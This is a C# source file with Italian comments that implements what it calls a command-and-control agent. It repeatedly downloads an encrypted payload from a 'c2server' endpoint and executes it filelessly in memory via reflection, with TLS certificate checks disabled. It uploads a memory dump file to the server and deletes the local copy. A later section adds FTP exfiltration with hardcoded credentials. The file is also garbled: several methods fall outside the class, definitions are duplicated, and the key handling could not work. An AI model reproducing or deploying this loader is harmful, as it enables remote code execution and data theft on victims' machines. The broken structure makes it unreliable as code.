using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Reflection;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.IdentityModel.Tokens.Jwt;
using Microsoft.IdentityModel.Tokens;

/*Codice Agenzia C# Avanzato (semplificato ma completo, commenti inclusi)*/

public class SecureAgent
{
    private static readonly string serverBaseUrl = "https://c2server.local/api"; // Endpoint HTTPS sicuro API
    private static readonly string payloadPath = "/payload/latest";
    private static readonly string reportUploadPath = "/reports/upload";
    
    // JWT Token per autenticazione (generare fuori e iniettare)
    private static string jwtToken = "eyJhbGciOiJ...";

    // AES chiave + IV (vanno generate e scambiate con DH o mittenza)
    private static byte[] aesKey;
    private static byte[] aesIv;

    // Percorso temp per payload (uso solo in memoria, ma per fallback salva qui temporaneamente)
    private static readonly string tempPayloadFile = Path.Combine(Path.GetTempPath(), "agent_payload.bin");
    private static readonly string logFilePath = Path.Combine(Path.GetTempPath(), "agent_secure.log");

    public static void Main()
    {
        InitializeKeys();

        Log("Agent avviato.");

        while (true)
        {
            try
            {
                Log("Scaricamento payload cifrato...");
                byte[] encryptedPayload = RetryAsync(() => DownloadPayload()).GetAwaiter().GetResult();

                if (encryptedPayload != null)
                {
                    byte[] payloadBytes = AesDecrypt(encryptedPayload, aesKey, aesIv);
                    Log($"Payload decifrato in memoria, esecuzione fileless...");

                    bool res = ExecuteFromMemory(payloadBytes);
                    Log($"Esecuzione payload {(res ? "riuscita" : "fallita")}");

                    Log("Preparazione e upload report criptato...");
                    RetryAsync(() => UploadEncryptedReport()).GetAwaiter().GetResult();
                }
                else
                {
                    Log("Download payload fallito.");
                }
            }
            catch (Exception ex)
            {
                Log("Eccezione generica: " + ex.Message);
            }

            Thread.Sleep(TimeSpan.FromHours(24));
        }
    }

    private static void InitializeKeys()
    {
        // Generate random AES Key / IV for demo - in real use exchange with server DH / handshake
        aesKey = new byte[32];
        aesIv = new byte[16];
        RandomNumberGenerator.Fill(aesKey);
        RandomNumberGenerator.Fill(aesIv);

        Log("Chiavi AES generate in memoria.");
    }

    private static async System.Threading.Tasks.Task<byte[]> DownloadPayload()
    {
        using (HttpClientHandler handler = new HttpClientHandler())
        {
            handler.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator;
            using HttpClient client = new HttpClient(handler);
            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", jwtToken);
            HttpResponseMessage response = await client.GetAsync(serverBaseUrl + payloadPath);

            response.EnsureSuccessStatusCode();
            return await response.Content.ReadAsByteArrayAsync();
        }
    }

    private static async System.Threading.Tasks.Task UploadEncryptedReport()
    {
        string reportFile = Path.Combine(Path.GetTempPath(), "memory_dump.bin");
        if (!File.Exists(reportFile))
        {
            Log("Nessun report da caricare.");
            return;
        }

        byte[] reportData = File.ReadAllBytes(reportFile);
        byte[] encryptedReport = AesEncrypt(reportData, aesKey, aesIv);

        using (HttpClientHandler handler = new HttpClientHandler())
        {
            handler.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator;
            using HttpClient client = new HttpClient(handler);

            client.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", jwtToken);
            using (var ms = new MemoryStream(encryptedReport))
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                form.Add(new StreamContent(ms), "file", "memory_dump.enc");

                HttpResponseMessage response = await client.PostAsync(serverBaseUrl + reportUploadPath, form);
                response.EnsureSuccessStatusCode();
            }
        }

        File.Delete(reportFile);
        Log("Report criptato caricato e eliminato.");
    }

    private static bool ExecuteFromMemory(byte[] rawAssembly)
    {
        try
        {
            Assembly asm = Assembly.Load(rawAssembly);
            MethodInfo entry = asm.EntryPoint;
            if (entry == null)
            {
                Log("Nessun entry point nel payload.");
                return false;
            }

            object instance = null;
            if (entry.GetParameters().Length > 0)
            {
                instance = asm.CreateInstance(entry.Name);
                entry.Invoke(instance, new object[] { new string[] { } });
            }
            else
            {
                entry.Invoke(null, null);
            }
            return true;
        }
        catch (Exception ex)
        {
            Log("Errore esecuzione payload fileless: " + ex.Message);
            return false;
        }
    }

    private static void Log(string message)
    {
        string logEntry = $"[{DateTime.UtcNow.ToString("o")}] {message}";
        Console.WriteLine(logEntry);
        File.AppendAllText(logFilePath, logEntry + Environment.NewLine, Encoding.UTF8);
    }

    private static T Retry<T>(Func<T> action, int maxRetries = 3, int delayMs = 2000)
    {
        int attempt = 0;
        while (attempt < maxRetries)
        {
            try
            {
                return action();
            }
            catch
            {
                attempt++;
                Thread.Sleep(delayMs * attempt);
            }
        }
        return default;
    }

    private static void Retry(Action action, int maxRetries = 3, int delayMs = 2000)
    {
        int attempt = 0;
        while (attempt < maxRetries)
        {
            try
            {
                action();
                return;
            }
            catch
            {
                attempt++;
                Thread.Sleep(delayMs * attempt);
            }
        }
        throw new Exception("Operation failed after retries");
    }

    private static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform encryptor = aes.CreateEncryptor();
            return encryptor.TransformFinalBlock(data, 0, data.Length);
        }
    }

    private static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform decryptor = aes.CreateDecryptor();
            return decryptor.TransformFinalBlock(data, 0, data.Length);
        }
    }
}
    private static async System.Threading.Tasks.Task<T> RetryAsync<T>(Func<System.Threading.Tasks.Task<T>> action, int maxRetries = 3, int delayMs = 2000)
    {
        int attempt = 0;
        while (attempt < maxRetries)
        {
            try
            {
                return await action();
            }
            catch
            {
                attempt++;
                await System.Threading.Tasks.Task.Delay(delayMs * attempt);
            }
        }
        return default;
    }
    private static async System.Threading.Tasks.Task RetryAsync(Func<System.Threading.Tasks.Task> action, int maxRetries = 3, int delayMs = 2000)
    {
        int attempt = 0;
        while (attempt < maxRetries)
        {
            try
            {
                await action();
                return;
            }
            catch
            {
                attempt++;
                await System.Threading.Tasks.Task.Delay(delayMs * attempt);
            }
        }
        throw new Exception("Operation failed after retries");
    }
    // Funzione per caricare report cifrato via FTP
    public static void UploadEncryptedReport(string localReportPath, string ftpUri, byte[] aesKey, byte[] aesIv)
    {
        if (!File.Exists(localReportPath))
        {
            Log("Nessun report da caricare.");
            return;
        }

        byte[] reportData = File.ReadAllBytes(localReportPath);
        byte[] encryptedReport = AesEncrypt(reportData, aesKey, aesIv);

        string tempFile = Path.Combine(Path.GetTempPath(), "report.enc");
        File.WriteAllBytes(tempFile, encryptedReport);

        using WebClient client = new WebClient();
        client.Credentials = new System.Net.NetworkCredential("ftpuser", "ftppassword"); // Credenziali FTP
        client.UploadFile(ftpUri, tempFile);

        File.Delete(tempFile);
    }
    public static async Task MainLoopAsync()
    {
        string localReportPath = "report.txt";
        string ftpUri = "ftp://server/upload/report.enc";
        byte[] aesKey = new byte[32]; // Replace with actual key
        byte[] aesIv = new byte[16];  // Replace with actual IV
        int maxRetries = 3;
        int retryDelayMs = 2000;
        while (true)
        {
            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                try
                {
                    UploadEncryptedReport(localReportPath, ftpUri, aesKey, aesIv);
                    Log("Report uploaded successfully");
                    break;
                }
                catch (Exception ex)
                {
                    Log($"Upload attempt {attempt + 1} failed: {ex.Message}");
                    await Task.Delay(retryDelayMs);
                }
            }
            await Task.Delay(60000); // Wait before next upload
        }
    }
    // Funzione AES per cifrare/decifrare un byte array con chiave e IV
    public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new();
        using (var cryptoStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
        }
        return ms.ToArray();
    }
    public static byte[] AesDecrypt(byte[] cipherText, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new(cipherText);
        using CryptoStream cryptoStream = new(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
        using MemoryStream resultStream = new();
        cryptoStream.CopyTo(resultStream);
        return resultStream.ToArray();
    }
    // Esempio di log sicuro
    public static void Log(string message)
    {
        string logPath = "agent_log.txt";
        string password = "s3cr3t"; // Example sensitive data
        string safeMsg = message.Replace(password, "***");
        File.AppendAllText(logPath, $"{DateTime.UtcNow:o} {safeMsg}\n");
    }
